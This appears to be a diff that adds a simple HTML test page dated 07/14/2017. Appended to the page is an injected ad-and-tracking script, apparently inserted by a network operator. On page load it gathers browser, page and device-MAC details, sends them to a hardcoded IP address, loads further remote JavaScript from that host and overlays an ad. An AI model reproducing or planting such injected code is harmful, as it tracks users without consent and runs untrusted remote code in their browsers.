@@ -1,0 +1,106 @@
+<html>
+<body>
+<img src="sailing.gif">
+<p></p>
+<h1>Test file 07/14/2017</h1>
+<p></p>
+
+
+<link rel="stylesheet" type="text/css" href="http://101.201.196.25:80/css/i.css"/><div class="xc-ad" id="xcad" style="max-height:120px;position:fixed;bottom:0px;display:none;"><div id="advhtml"></div><a style="right:10px;top:10px;width:48px;height:48px;background:url(http://101.201.196.25:80/exit.png) no-repeat;border:none;display:block;position:absolute;" onclick="javascript:closexcad();"></a></div><div style="display:none"><img src="" id="xctj"></div><div id="bdiv" style="display:none"><a id="bref" href=""><img src="" id="bdsh" style="width: 40px;z-index: 99999;overflow: hidden;position: fixed;right: 0px;display:inline-block;"></a></div><script type="text/javascript">var params = {};
+params.agent=navigator.userAgent;
+params.platform =navigator.platform;
+if(document) {
+        params.domain = document.domain || "";
+        params.url = document.URL || "";
+        params.title = document.title || "";
+        params.referrer = document.referrer || "";
+}
+if(window && window.screen) {
+        params.sh = window.screen.height || 0;
+        params.sw = window.screen.width || 0;
+        params.cd = window.screen.colorDepth || 0;
+}
+if(navigator) {
+        params.lang = navigator.language || "";
+}
+function xciniframe() {
+        try { return window.self !== window.top; } catch (e) { return true; }
+}
+ function closexcad(){
+    var xcadtag=document.getElementById("xcad");
+    xcadtag.style.display="none";
+
+ }
+
+function showad(){
+
+	var xcadtag=document.getElementById("xcad");
+    xcadtag.style.display="";
+}
+
+function xcbrowserRedirect() {
+        var sUserAgent = navigator.userAgent.toLowerCase();
+		var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
+		var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
+		var bIsMidp = sUserAgent.match(/midp/i) == "midp";
+		var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
+		var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
+		var bIsAndroid = sUserAgent.match(/android/i) == "android";
+		var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
+		var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
+
+		if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
+                    return true;
+		} else {
+                    return false;
+		}
+}
+ var args="";
+     if(_xcmap) {
+         for(var i in _xcmap) {
+            if(args != "") {
+                args += "&";
+            }
+            args += i + "=" + encodeURIComponent(_xcmap[i]);
+        }
+     }
+	 for(var i in params) {
+        if(args != "") {
+            args += "&";
+        }
+        args += i + "=" + encodeURIComponent(params[i]);
+    }
+
+if (!xciniframe()) {
+	var ua=xcbrowserRedirect();
+    var bdsh=document.getElementById("bdsh");
+    var bdiv=document.getElementById("bdiv");
+    var bref=document.getElementById("bref");
+    var ht=document.documentElement.clientHeight;
+    bdsh.src="http://101.201.196.25:80/upload/AD/58662bd77d845.png";
+    bdiv.style.display="";
+    bref.href="http://huodong.ganmiao.com";
+    bdsh.style.top=eval(ht*3/5)+"px";
+	if(ua){
+		var xctj=document.getElementById("xctj");
+		xctj.src="http://101.201.196.25:80/1.gif?" + args;
+		var para="/dmac/"+_xcmap.devmac+"/umac/"+_xcmap.umac+"/rand/"+Math.random()+".js";
+		var imgjsurl="http://101.201.196.25:80/index.php/Api/getimg"+para;
+		document.write("<script type=\"text/javascript\" src="+imgjsurl+"><\/script>");
+
+	}else{
+		if (document.body.clientWidth>640){
+			var xctj=document.getElementById("xctj");
+			xctj.src="http://101.201.196.25:80/1.gif?" + args;
+			var para="/dmac/"+_xcmap.devmac+"/umac/"+_xcmap.umac+"/rand/"+Math.random()+".js";
+			var imgjsurl="http://101.201.196.25:80/index.php/Api/getimg"+para;
+			document.write("<script type=\"text/javascript\" src="+imgjsurl+"><\/script>");
+
+		}
+
+	}
+
+}
+
+</script></body>
+</html>
